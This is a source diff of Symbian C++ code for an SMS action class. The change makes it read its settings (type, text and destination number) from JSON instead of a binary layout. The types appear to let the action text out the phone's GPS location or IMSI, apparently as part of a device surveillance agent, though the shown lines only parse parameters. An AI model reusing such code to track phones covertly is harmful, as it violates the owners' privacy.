@@ -9,6 +9,7 @@
  */
 
 #include "ActionSms.h"
+#include "Json.h"
 
 CActionSms::CActionSms() :
 	CAbstractAction(EAction_Sms)
@@ -53,40 +54,52 @@ void CActionSms::ConstructL(const TDesC8& params)
 	iPhone = CPhone::NewL();
 	iGPS = CGPSPosition::NewL(*this);
 	
-	// Parses the parameters...
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	//iOption = (TSmsOptionType) *(TUint32*)ptr;  // crash on N96
-	Mem::Copy(&iOption, ptr, 4);
-	ptr += sizeof(TUint32);
 	
-	/* TUint32 lenNumb = *(TUint32*)ptr; */   // N96 crash, use Mem::Copy
-	TUint32 lenNumb = 0;
-	Mem::Copy(&lenNumb, ptr, 4);
-
-	ptr += sizeof(TUint32);
-	
-	if (lenNumb > 0)
+	//parse params
+	RBuf paramsBuf;
+				
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
 		{
-		TUint8 totChars = (lenNumb-1) / 2;
-		TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
-		iSmsNumber.Copy(ptrNum);
+		paramsBuf.Copy(params);
 		}
-	ptr += lenNumb;
-	
-	if (iOption == ESms_Text)
+	else
 		{
-		/* TUint32 lenText = *(TUint32*)ptr; */  // crash on N96, use Mem::Copy
-		TUint32 lenText = 0;
-		Mem::Copy(&lenText, ptr, 4);
-
-		ptr += sizeof(TUint32);
-		if (lenText > 0)
+		//TODO: not enough memory
+		}
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve type
+		TBuf<8> typeBuf;
+		rootObject->GetStringL(_L("type"),typeBuf);
+		if(typeBuf.Compare(_L("location")) == 0)
 			{
-			TUint8 totChars = (lenText-1) / 2;
-			TPtr16 ptrText((TUint16 *) ptr, totChars, totChars);
-			iSmsText.Copy(ptrText);
+			iOption = ESms_GPS;
 			}
+		else if (typeBuf.Compare(_L("text")) == 0)
+			{
+			iOption = ESms_Text;
+			//retrieve text
+			rootObject->GetStringL(_L("text"),iSmsText);
+			}
+		else
+			{
+			iOption = ESms_IMSI;
+			}
+		//retrieve number
+		rootObject->GetStringL(_L("number"),iSmsNumber);
+		CleanupStack::PopAndDestroy(rootObject);
 		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 	}
 
 void CActionSms::DispatchStartCommandL()
